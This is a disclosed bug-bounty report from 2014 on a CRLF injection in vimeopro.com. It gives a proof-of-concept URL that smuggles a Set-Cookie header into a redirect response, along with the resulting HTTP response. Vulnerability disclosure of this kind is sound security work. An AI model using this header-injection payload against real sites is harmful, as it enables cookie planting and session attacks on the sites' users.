# [vimeopro.com] CRLF Injection

## Report Details
- **Report ID**: 39181
- **URL**: https://hackerone.com/reports/39181
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2014-12-12T19:33:03.836Z
- **Disclosed**: 2016-10-24T21:45:00.298Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: vimeo

## Vulnerability Information
PoC (for any browser other than FireFox)
http://www.vimeopro.com/crlftest%0dSet-Cookie:test=test;domain=.vimeopro.com

HTTP Response:
HTTP/1.1 301 Moved Permanently\r\n
Date: Fri, 12 Dec 2014 19:28:49 GMT\r\n
Server: Apache\r\n
Location: http://vimeopro.com/crlftest\r
Set-Cookie:test=test;domain=.vimeopro.com\r\n

Result:
Creating a cookie-param "test=test"

## Attachments
No attachments
